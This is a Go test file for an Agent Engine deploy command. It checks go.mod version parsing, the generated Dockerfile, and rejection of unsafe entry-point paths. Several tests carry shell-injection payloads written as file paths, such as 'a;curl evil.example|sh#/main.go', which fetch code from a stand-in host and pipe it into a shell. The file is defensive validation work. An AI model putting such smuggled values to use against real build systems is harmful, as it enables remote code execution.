// Copyright 2025 Google LLC
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

package agentengine

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func TestGoVersionFromModFile(t *testing.T) {
	tests := []struct {
		name string
		mod  string
		want string
	}{
		{"patch version", "module x\n\ngo 1.26.5\n", "1.26.5"},
		{"minor version", "module x\n\ngo 1.26\n", "1.26"},
		{
			name: "ignores require block modules",
			mod:  "module x\n\ngo 1.26.5\n\nrequire (\n\tgoogle.golang.org/adk/v2 v2.1.0\n)\n",
			want: "1.26.5",
		},
		{
			name: "ignores toolchain line",
			mod:  "module x\n\ngo 1.26.5\n\ntoolchain go1.26.5\n",
			want: "1.26.5",
		},
		{"no go directive", "module x\n", ""},
		{"strips trailing line comment", "module x\n\ngo 1.26.5 // pinned by platform team\n", "1.26.5"},
		{"rejects malformed version", "module x\n\ngo 1abc\n", ""},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := goVersionFromModFile([]byte(tt.mod)); got != tt.want {
				t.Errorf("goVersionFromModFile() = %q, want %q", got, tt.want)
			}
		})
	}
}

// TestPrepareDockerfile_UsesGoModVersion guards that the generated builder image
// tracks the application's go.mod Go version instead of a hardcoded tag, so a
// managed Agent Engine build uses a toolchain that can actually compile the app.
func TestPrepareDockerfile_UsesGoModVersion(t *testing.T) {
	dir := t.TempDir()
	if err := os.WriteFile(filepath.Join(dir, "go.mod"),
		[]byte("module example.com/agent\n\ngo 1.26.5\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	dockerfile := filepath.Join(dir, "Dockerfile")

	f := &deployAgentEngineFlags{}
	f.source.sourceDir = dir
	f.source.origEntryPointPath = "./main.go"
	f.build.execFile = "agent"
	f.build.dockerfileBuildPath = dockerfile

	if err := f.prepareDockerfile(); err != nil {
		t.Fatalf("prepareDockerfile() error = %v", err)
	}
	content, err := os.ReadFile(dockerfile)
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(string(content), "FROM golang:1.26.5 AS builder") {
		t.Errorf("Dockerfile does not use the go.mod Go version:\n%s", content)
	}
	if strings.Contains(string(content), "golang:1.25") {
		t.Errorf("Dockerfile still hardcodes golang:1.25:\n%s", content)
	}
	if !strings.Contains(string(content), "ENV GOTOOLCHAIN=auto") {
		t.Errorf("Dockerfile is missing the GOTOOLCHAIN=auto safety net:\n%s", content)
	}
}

// TestDefaultBuilderGoVersionIsNotPinned guards that the last-resort tag stays a
// rolling tag. A pinned version here would silently rot exactly like the
// hardcoded tag this change removed, so it must never be reintroduced.
func TestDefaultBuilderGoVersionIsNotPinned(t *testing.T) {
	if isGoVersion(defaultBuilderGoVersion) {
		t.Errorf("defaultBuilderGoVersion = %q pins a version; use a rolling tag such as %q",
			defaultBuilderGoVersion, "latest")
	}
}

// resetFlags points the package-level flags var at a fresh, minimally valid
// state for the duration of one test, restoring the previous value afterwards.
// computeFlags reads and writes that global directly, and prepareDockerfile
// reads it too, so leaving it holding the zero value would discard the defaults
// cobra installs at flag registration (server_port 8080 among them) for every
// later test in this binary.
func resetFlags(t *testing.T, entryPointPath string) {
	t.Helper()
	saved := flags
	t.Cleanup(func() { flags = saved })

	flags = deployAgentEngineFlags{}
	flags.source.entryPointPath = entryPointPath
	flags.build.tempDir = t.TempDir()
}

// allowListRejection is the distinctive part of the ValidateShellArgSafe
// rejection message. The tests below match on it rather than on the label,
// because "entry point" is also a substring of the pre-existing StripExtension
// wrapper ("cannot strip '.go' extension from entry point path '%v'"): a
// payload edited to drop the .go extension would then satisfy a label-only
// assertion while saying nothing about the allow-list.
const allowListRejection = "not allowed in a value embedded in generated Dockerfile content"

func TestComputeFlags_RejectsUnsafeEntryPointBasename(t *testing.T) {
	// The basename (with .go stripped) becomes f.build.execFile, embedded
	// directly into the generated Dockerfile's RUN/COPY/CMD lines.
	maliciousEntryPoint := "main\"\nRUN curl evil.example | sh\n#.go"
	resetFlags(t, maliciousEntryPoint)

	err := flags.computeFlags()
	if err == nil {
		t.Fatal("computeFlags() = nil, want an error rejecting the unsafe entry point basename")
	}
	if !strings.Contains(err.Error(), allowListRejection) {
		t.Errorf("computeFlags() error = %v, want the allow-list rejection %q", err, allowListRejection)
	}
	// The checked value is derived, so the message has to name the flag it was
	// derived from for the user to be able to find it in their command line.
	if !strings.Contains(err.Error(), "derived from --entry_point_path") {
		t.Errorf("computeFlags() error = %v, want it to name the flag the executable name came from", err)
	}
}

func TestComputeFlags_RejectsUnsafeOrigEntryPointPath(t *testing.T) {
	// origEntryPointPath is the raw --entry_point_path value, captured before
	// any path processing. execFile, by contrast, is derived only from the
	// basename of that path, so a malicious directory component doesn't
	// affect it. This payload keeps the basename clean ("main.go", so the
	// ".go"-extension strip and the execFile check both succeed) while the
	// directory component still carries shell metacharacters straight into
	// the Dockerfile's `RUN ... -o execFile origEntryPointPath` line.
	maliciousEntryPoint := "a;curl evil.example|sh#/main.go"
	resetFlags(t, maliciousEntryPoint)

	err := flags.computeFlags()
	if err == nil {
		t.Fatal("computeFlags() = nil, want an error rejecting the unsafe --entry_point_path value")
	}
	if !strings.Contains(err.Error(), allowListRejection) {
		t.Errorf("computeFlags() error = %v, want the allow-list rejection %q", err, allowListRejection)
	}
	// The raw-flag check, not the derived-executable-name one above it.
	if !strings.HasPrefix(err.Error(), "--entry_point_path ") {
		t.Errorf("computeFlags() error = %v, want the --entry_point_path check to be the one that fired", err)
	}
}

func TestComputeFlags_AcceptsBenignValues(t *testing.T) {
	resetFlags(t, "main.go")

	if err := flags.computeFlags(); err != nil {
		t.Fatalf("computeFlags() = %v, want no error for benign values", err)
	}
	if flags.build.execFile != "main" {
		t.Errorf("execFile = %q, want %q", flags.build.execFile, "main")
	}
}

// TestComputeFlags_AcceptsNonASCIIEntryPoint guards the deliberate decision to
// let the shell-arg allowlist admit non-ASCII runes. Every byte of a multi-byte
// UTF-8 rune is >= 0x80 and every shell metacharacter is ASCII, so admitting
// them costs nothing in safety, while rejecting them would fail deploys whose
// --entry_point_path merely passes through a non-ASCII directory name.
func TestComputeFlags_AcceptsNonASCIIEntryPoint(t *testing.T) {
	resetFlags(t, "agentes/café/agenté.go")

	if err := flags.computeFlags(); err != nil {
		t.Fatalf("computeFlags() = %v, want no error for a non-ASCII entry point path", err)
	}
	if flags.build.execFile != "agenté" {
		t.Errorf("execFile = %q, want %q", flags.build.execFile, "agenté")
	}
}

// TestComputeFlags_RejectionLeavesNoTempDir pins the ordering of both checks
// against os.MkdirTemp. cleanTemp only runs after a fully successful deploy —
// there is no defer — so a check that fires after the temp dir is created
// leaves an empty agentEngine_<timestamp>_* directory behind on every rejected
// invocation. Only execPath needs the temp dir, so both checks belong above it.
func TestComputeFlags_RejectionLeavesNoTempDir(t *testing.T) {
	for name, entryPoint := range map[string]string{
		"unsafe basename":  "main\"\nRUN curl evil.example | sh\n#.go",
		"unsafe directory": "a;curl evil.example|sh#/main.go",
	} {
		t.Run(name, func(t *testing.T) {
			resetFlags(t, entryPoint)
			parent := flags.build.tempDir

			if err := flags.computeFlags(); err == nil {
				t.Fatal("computeFlags() = nil, want an error")
			}
			entries, err := os.ReadDir(parent)
			if err != nil {
				t.Fatalf("cannot read the temp dir parent: %v", err)
			}
			for _, e := range entries {
				t.Errorf("rejected invocation left %q behind in the temp dir parent", e.Name())
			}
		})
	}
}

// TestPrepareDockerfile_EntryPointReachesRUNLine pins the reason
// origEntryPointPath exists at all, and the reason it takes the stronger
// validator: it is the raw --entry_point_path value, not the absolutised one,
// that lands in the builder stage's RUN line. That stage's build context is
// rooted at /app by `COPY . .`, so a host-absolute path there fails every
// deploy. Without this the emitted line is only connected to the field by
// reading the code — moving the capture below the filepath.Abs assignment
// leaves the rest of the suite green. cloudrun ships the symmetric test for
// its CMD array.
func TestPrepareDockerfile_EntryPointReachesRUNLine(t *testing.T) {
	const entryPoint = "cmd/quickstart/main.go"
	resetFlags(t, entryPoint)
	flags.agentEngine.serverPort = 8080

	if err := flags.computeFlags(); err != nil {
		t.Fatalf("computeFlags() = %v, want no error", err)
	}
	if err := flags.prepareDockerfile(); err != nil {
		t.Fatalf("prepareDockerfile() = %v, want no error", err)
	}

	content, err := os.ReadFile(flags.build.dockerfileBuildPath)
	if err != nil {
		t.Fatalf("cannot read the generated Dockerfile: %v", err)
	}
	var runLine string
	for _, line := range strings.Split(string(content), "\n") {
		if rest, ok := strings.CutPrefix(line, "RUN "); ok {
			runLine = rest
		}
	}
	if runLine == "" {
		t.Fatalf("no RUN instruction in the generated Dockerfile:\n%s", content)
	}

	want := "-o " + flags.build.execFile + " " + entryPoint
	if !strings.HasSuffix(runLine, want) {
		t.Errorf("RUN line = %q, want it to end with %q", runLine, want)
	}
}
